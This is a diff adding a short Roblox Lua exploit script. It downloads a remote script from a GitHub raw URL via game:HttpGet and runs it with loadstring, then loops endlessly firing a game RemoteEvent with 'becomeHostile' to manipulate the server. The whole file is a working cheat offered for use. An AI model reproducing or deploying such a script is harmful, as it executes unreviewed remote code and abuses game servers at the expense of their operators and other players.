@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MarcillisePex/TheDarkoneGUI/main/The%20Source"))()
+while task.wait() do
+   workspace.resources.RemoteEvent:FireServer("becomeHostile") 
+end
